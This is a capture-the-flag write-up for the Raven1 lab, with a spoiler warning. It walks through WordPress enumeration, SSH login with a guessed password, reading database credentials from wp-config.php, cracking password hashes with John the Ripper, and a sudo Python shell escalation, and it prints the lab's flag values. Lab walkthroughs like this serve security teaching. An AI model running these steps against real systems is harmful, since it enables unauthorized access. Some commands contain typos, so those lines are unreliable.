# Raven1 CTF Pen-Test

**If you're attempting this CTF, I would urge you to _TRY HARDER_ before proceeding as, obviously, there are spoilers below!**

The following vulnerabilities were identified:

1.	Weak password requirements 
  a.	CWE-521 https://cwe.mitre.org/data/definitions/521.html 
  b.	CWE-522 https://cwe.mitre.org/data/definitions/522.html 
  c.	Severity: Critical 

2.	Wordpress – username enumaration
  a.	CVE-2009-2335 https://cve.mitre.org/cgi-bin/cvename.cgi?name=2009-2335 
  b.	Severity: Medium

3.	Wordpress – wp-config.php & sensitive information exposure - externally accessible
  a.	CWE-538 https://cwe.mitre.org/data/definitions/538.html 
  b.	Severity: High
 ___________________________________________________
 
 ## Exploitation
 
Nmap identifies Apache Http and by browsing the target IP we can identify that wordpress is being used.
 
We can then enumerate wordpress by:
```
Wpscan --url http://192.168.1.110/wordpress/ --enumerate
```

This provides clues as to which directories to look through.
By using inspect element, on each page we are able to locate **Flag1**

●	**flag1.txt: b9bbcb33e11b80be759c4e844862482d**

____________________________________________


We then proceed to explore further based on the information gathered thus far.
Both Michael and Steven have been identified as users. 
A quick integrity check of their passwords reveals that Michael is using his name as his password!
This allows us to SSH into Michael's account and search for flags, and sure enough, **Flag2** is found.

```
ssh micahel@192.168.1.110
```
Password: michael

```
find / -type f -iname flag*.*
```

●	**flag2.txt: fc3fd58dcdad9ab23faca6e9a36e581c**

____________________________________

While still logged in as Michael, we navigate to the wp-config.php file.
The file is available and accessible.
Simply opening the file in a text editor reveals the username and password of the MySQL database.
MySQL username: root
MySQL password: R@v3nSecurity

Within the MySQL database we then navigate the various tables and locate **Flag3**

```
Mysql -r root -p
use wordpress;
show tables;
select * from wp_posts;
```
●	**Flag3.txt: afc01ab56b50591e7dccf93122770cd2**

______________________________________


Still within the MySQL database, we can find the password hashes of the users and crack them to gain access to Steven's account.

```
Mysql -r root -p
user wordpress;
show tables;
select * from wp_users;
```

Copy/paste the hashes into wp_password_hashes.txt and use John The Ripper to crack it.

```
John --wordlist=usr/share/wordlists/rockyou.txt wp_password_hashes.txt
```

Steven’s password: pink84

We can now log into Steven's account, spawn a shell, and find **Flag4**
```
Ssh steven@192.168.1.110
Sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
Sudo find / -type f -iname flag*
```

●	**Flag4.txt: 715dea6c055b9fe3337544932f2941ce**

